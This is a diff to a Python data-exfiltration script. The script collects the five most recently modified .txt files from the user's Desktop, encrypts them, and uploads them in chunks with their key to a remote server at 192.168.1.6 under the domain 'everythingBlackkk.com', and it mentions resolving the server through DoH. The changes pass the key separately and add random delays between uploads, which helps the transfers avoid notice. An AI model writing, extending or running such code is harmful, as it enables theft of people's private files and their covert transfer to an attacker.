@@ -27,7 +27,7 @@ def get_recent_txt_files(directory, number_of_files):
     print(f"{Fore.GREEN}[ + ] Found recent .txt files: {recent_files}")
     return recent_files
 
-def send_file_in_chunks(file_path, server_ip, cipher_suite):
+def send_file_in_chunks(file_path, server_ip, cipher_suite, key):
     try:
         file_size = os.path.getsize(file_path)
     except FileNotFoundError:
@@ -46,7 +46,7 @@ def send_file_in_chunks(file_path, server_ip, cipher_suite):
                 'file': (file_name, encrypted_chunk),
                 'chunk_number': (None, str(chunk_number)),
                 'total_size': (None, str(file_size)),
-                'key': (None, base64.urlsafe_b64encode(cipher_suite._signing_key).decode('utf-8'))
+                'key': (None, base64.urlsafe_b64encode(key).decode('utf-8'))
             }
             print(f"{Fore.CYAN}[ * ] Sending chunk {chunk_number // CHUNK_SIZE} of file {file_name}")
             print(f"{Fore.CYAN}[ + ] Chunk size: {len(encrypted_chunk)} bytes, Memory address: {hex(id(encrypted_chunk))}")
@@ -61,18 +61,18 @@ def send_file_in_chunks(file_path, server_ip, cipher_suite):
                     break
             except requests.RequestException as e:
                 print(f"{Fore.RED}[ ! ] Error during upload: {e}")
-            time.sleep(0.5)
+            time.sleep(random.uniform(0.5, 2.0))
 
 if __name__ == "__main__":
-    desktop_dir = os.path.join(os.path.expanduser("~"), "Desktop") 
+    desktop_dir = os.path.join(os.path.expanduser("~"), "Desktop")  
     recent_txt_files = get_recent_txt_files(desktop_dir, 5) 
     
     domain = "everythingBlackkk.com" 
-    server_ip = "192.168.1.6" 
+    server_ip = "192.168.1.6"  
     
     if server_ip:
-        print(f"{Fore.GREEN}[ + ] Resolsved server IP: {server_ip}")
+        print(f"{Fore.GREEN}[ + ] Resolved server IP: {server_ip}")
         for recent_file in recent_txt_files:
-            send_file_in_chunks(recent_file, server_ip, cipher_suite)
+            send_file_in_chunks(recent_file, server_ip, cipher_suite, key)
     else:
         print(f"{Fore.RED}[ ! ] Failed to resolve server IP using DoH providers")
